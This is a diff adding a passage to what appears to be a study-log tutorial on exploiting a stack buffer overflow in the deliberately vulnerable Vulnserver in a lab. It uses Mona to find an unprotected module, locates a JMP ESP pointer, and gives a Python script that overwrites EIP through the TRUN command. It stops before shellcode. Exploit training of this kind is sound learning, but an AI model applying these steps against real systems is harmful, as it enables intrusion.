@@ -306,5 +306,71 @@ Immunity Debugger
 
 Local Disk ---> Program Files (x86) ------> Immunity Inc ------> Immunity Debugger -------> PyCommands -----> paste the Mona.py file in it.
 
+Now let confirm if we have our module in immunity debugger ready let try and type `!mona modules` we should get something like that below;
+
+![Image](https://imgur.com/eIqqysW.png)
+
+What we’re looking for is `False` across the board, preferably. That means there are no memory protections present in the module if it `True` it mean we have memory protection on the board. The top module catches my eye immediately. It looks like essfunc.dll is running as part of Vulnserver and has no memory protections. Let’s write down the module and move on to the next step.
+
+What we need to do now is find the opcode equivalent of JMP ESP. We are using JMP ESP because our EIP will point to the JMP ESP location, which will jump to our malicious shellcode that we will inject later. Finding the opcode equivalent means we are converting assembly language into hexcode. There is a tool to do this called nasm_shell.
+
+Now let locate `Nasm_shell`
+
+![Image](https://imgur.com/8AzcYoV.png)
 
 
+Now let type `JMP ESP`
+
+![image](https://imgur.com/v9l8WE3.png)
+
+Our JMP ESP opcode equivalent is `FFE4`. Now, we can use Mona again to combine this new information with our previously discovered module to find our pointer address. The pointer address is what we will place into the EIP to point to our malicious shellcode. In our Immunity searchbar, let’s type;
+
+`!mona find -s "\xff\xe4" -m essfunc.dll`
+
+![image](https://imgur.com/Yz5Wts3.png)
+
+Cool some really interesting pointers, What we have just generated is a list of addresses that we can potentially use as our pointer. I am going to select the second address, 625011BB.
+
+![image](https://imgur.com/yP7hWlI.png)
+
+![Image](https://imgur.com/RzpwdEd.png)
+
+Now let edit our shell code like that below;
+
+```
+#!/usr/bin/python 
+import sys, socket
+ 
+shellcode = "A" * 2003 + "\xbb\x11\x50\x62"
+
+try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('172.16.139.133',9999))
+        s.send(('TRUN /.:/' + shellcode))
+        s.close()
+
+except:
+        print "Error Connecting To Server" 
+        sys.exit()
+```
+
+Note the pointer number `625011BB` was now going backwards `"\xbb\x11\x50\x62` This is actually called Little Endian.
+
+We have to use the Little Endian format in x86 architecture because the low-order byte is stored in the memory at the lowest address and the high-order byte is stored at the highest address. Thus, we enter our return address in backwards.
+
+Now we need to find our return address in Immunity Debugger. To do this, click on the far right arrow on the top panel of Immunity dubugger.
+
+![Image](https://imgur.com/MrjlX5U.png)
+
+Then search for `625011BB` (or the return address you found), without the quotes, in the `Enter expression to follow` prompt. That should bring up our return address, FFE4, JMP ESP location. Once we found it i hit F2 and the address turn baby blue, indicating that we have set a breakpoint.
+
+![Image](https://imgur.com/exYO9vE.png)
+
+Now let execute our code that we save and see if the breakpoint triggers. If we notice it trigger in Immunity Debugger, we are in the home stretch and ready to develop our exploit now let click on the play before executing our code.
+
+![image](https://imgur.com/TObP4fe.png)
+
+Boom we mean we have a breakpoint and which mean we have total control of the EIP `625011BB` Cool now the next thing for us to do is to generate a shellcode and point it to the shellcode and boom we should get a shell smilling back at us.
+
+
+####  `Day 8`
